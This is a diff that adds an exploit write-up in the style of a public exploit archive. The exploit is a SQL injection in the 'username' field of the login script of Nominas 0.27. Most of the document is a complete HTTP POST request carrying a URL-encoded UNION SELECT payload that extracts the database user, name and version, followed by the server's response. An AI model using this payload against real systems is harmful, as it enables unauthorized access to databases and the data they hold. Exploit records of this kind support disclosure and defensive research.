@@ -1,0 +1,40 @@
+# Exploit Title: Nominas 0.27 - 'username' SQL Injection
+# Dork: N/A
+# Date: 2018-11-09
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://arixolab.com/proyecto.html
+# Software Link: https://netix.dl.sourceforge.net/project/nominascrm/Nominas%20v0.27.tar.gz
+# Version: 0.27
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/login/checklogin.php
+# 
+POST /[PATH]/login/checklogin.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/[PATH]/login/login.php
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 160
+username=%27+UNION+ALL+SELECT+0x31%2C0x32%2C0x33%2CCONCAT_WS%280x203a20%2CUSER%28%29%2CDATABASE%28%29%2CVERSION%28%29%29--+Ver+Ayari&password=Efe&logarse=Entrar
+HTTP/1.1 302 Found
+Date: Fri, 09 Nov 2018 23:08:26 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Set-Cookie: PHPSESSID=agq97ac0093v2f94voc6qfr7j3; path=/
+Set-Cookie: PHPSESSID=mqvaree7bi45p9q60fh2g5vhg1; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: ../index.php
+Content-Length: 1
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
